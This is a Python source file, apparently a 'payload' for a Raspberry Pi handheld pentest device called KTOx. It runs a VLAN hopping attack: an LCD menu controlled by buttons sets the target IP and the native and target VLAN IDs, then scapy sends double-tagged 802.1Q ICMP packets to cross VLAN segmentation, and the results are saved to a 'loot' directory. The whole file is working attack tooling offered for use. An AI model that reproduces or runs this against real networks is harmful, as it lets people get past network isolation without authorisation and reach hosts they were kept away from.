#!/usr/bin/env python3
"""
KTOx *payload* – **VLAN Hopper**
===================================
This payload attempts to perform a basic VLAN hopping attack using double-tagging.
It constructs a specially crafted 802.1Q packet with two VLAN tags, aiming to
bypass VLAN segmentation and reach a target host on a different VLAN.

Features:
- Interactive UI for configuring target IP, native VLAN, and target VLAN.
- Constructs and sends double-tagged 802.1Q packets.
- Displays success or failure of the ICMP reply on the LCD.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- CONFIGURATION SCREEN:
    - UP/DOWN: Navigate configuration parameters.
    - OK: Edit selected parameter.
    - KEY1: Launch VLAN hopping attack.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel input.
- VLAN INPUT SCREEN:
    - UP/DOWN: Increment/decrement VLAN ID.
    - OK: Confirm VLAN ID.
    - KEY3: Cancel input.
"""
import sys
import os
import time
import signal
import subprocess

KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
_wifi_dir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
    sys.path.insert(0, _wifi_dir)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *
conf.verb = 0

LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'vlan_hopper')
os.makedirs(LOOT_DIR, exist_ok=True)

PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

ETH_INTERFACE = "eth0"
running = True
target_ip = "192.168.20.10"
native_vlan = 1
target_vlan = 20
current_ip_input = target_ip
ip_input_cursor_pos = 0

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(message, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

def draw_config_ui(params, selected_index, screen_state="config"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "VLAN Hopper Config", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if screen_state == "config":
        y_pos = 25
        param_keys = list(params.keys())
        for i, key in enumerate(param_keys):
            color = "yellow" if i == selected_index else "white"
            d.text((5, y_pos), f"{key}: {params[key]}", font=FONT, fill=color)
            y_pos += 15
            
        d.text((5, 110), "OK=Edit | KEY1=Launch", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_config_ui({}, 0, screen_state="ip_input")
    
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.2 # seconds

    while running:
        current_time = time.time()
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                draw_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_config_ui({}, 0, screen_state="ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_config_ui({}, 0, screen_state="ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_config_ui({}, 0, screen_state="ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_config_ui({}, 0, screen_state="ip_input")
        
        time.sleep(0.05)
    return None

def get_user_number(prompt, initial_value):
    value = initial_value
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.2 # seconds

    while running:
        current_time = time.time()
        draw_message(f"{prompt}:\n{value}\nUP/DOWN | OK=Save")
        
        if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            value += 1
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            value = max(1, value - 1)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return value
        elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return initial_value
        time.sleep(0.05)

def run_vlan_hop_attack(src_mac, target_ip, native_vlan, target_vlan):
    draw_message("Sending packet...")
    
    try:
        gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
        gateway_mac = getmacbyip(gateway_ip)
        if not gateway_mac:
            raise Exception("Gateway MAC not found")
    except Exception as e:
        draw_message(f"Error: {e}", "red")
        try:
            ts = time.strftime('%Y-%m-%d_%H%M%S')
            with open(os.path.join(LOOT_DIR, f"vlan_hopper_{ts}.txt"), 'w') as f:
                f.write("VLAN Hopper Attempt FAILED\n")
                f.write(f"Reason: {e}\n")
                f.write(f"Target IP: {target_ip}\nNative VLAN: {native_vlan}\nTarget VLAN: {target_vlan}\n")
                f.write(f"Interface: {ETH_INTERFACE}\nTimestamp: {ts}\n")
        except Exception as le:
            print(f"Loot save failed: {le}", file=sys.stderr)
        time.sleep(3)
        return

    packet = (
        Ether(src=src_mac, dst=gateway_mac) /
        Dot1Q(vlan=native_vlan) /
        Dot1Q(vlan=target_vlan) /
        IP(dst=target_ip) /
        ICMP()
    )
    
    ans = srp1(packet, iface=ETH_INTERFACE, timeout=5, verbose=0)
    
    ts = time.strftime('%Y-%m-%d_%H%M%S')
    loot_path = os.path.join(LOOT_DIR, f"vlan_hopper_{target_ip}_{native_vlan}_{target_vlan}_{ts}.txt")
    try:
        with open(loot_path, 'w') as f:
            f.write("VLAN Hopper Attempt\n")
            f.write(f"Target IP: {target_ip}\nNative VLAN: {native_vlan}\nTarget VLAN: {target_vlan}\n")
            f.write(f"Interface: {ETH_INTERFACE}\nTimestamp: {ts}\n")
            f.write("Result: ")
            if ans and ans.haslayer(ICMP) and ans[ICMP].type == 0:
                f.write("SUCCESS - ICMP Reply received\n")
            else:
                f.write("FAIL - No reply\n")
    except Exception as le:
        print(f"Loot save failed: {le}", file=sys.stderr)

    if ans and ans.haslayer(ICMP) and ans[ICMP].type == 0:
        draw_message("SUCCESS!\nGot ICMP Reply.", "lime")
    else:
        draw_message("FAIL\nNo reply received.", "red")
        
    time.sleep(4)

if __name__ == '__main__':
    try:
        try:
            src_mac = get_if_hwaddr(ETH_INTERFACE)
            src_ip = get_if_addr(ETH_INTERFACE)
        except Exception:
            draw_message("eth0 not ready!", "red")
            time.sleep(3)
            raise SystemExit("eth0 interface not found or has no IP.")

        params = {
            "Target IP": target_ip,
            "Native VLAN": native_vlan,
            "Target VLAN": target_vlan
        }
        param_keys = list(params.keys())
        selected_index = 0

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.2 # seconds

        while running:
            current_time = time.time()
            draw_config_ui(params, selected_index)
            
            if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                cleanup()
                break
            
            if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                selected_index = (selected_index - 1) % len(param_keys)
                time.sleep(BUTTON_DEBOUNCE_TIME)
            elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                selected_index = (selected_index + 1) % len(param_keys)
                time.sleep(BUTTON_DEBOUNCE_TIME)
            elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                key = param_keys[selected_index]
                if key == "Target IP":
                    new_ip = handle_ip_input_logic(params[key])
                    if new_ip:
                        params[key] = new_ip
                        target_ip = new_ip
                else:
                    new_val = get_user_number(key, params[key])
                    params[key] = new_val
                time.sleep(BUTTON_DEBOUNCE_TIME)
            elif GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                run_vlan_hop_attack(src_mac, params["Target IP"], params["Native VLAN"], params["Target VLAN"])
                time.sleep(BUTTON_DEBOUNCE_TIME)

            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("VLAN Hopper payload finished.")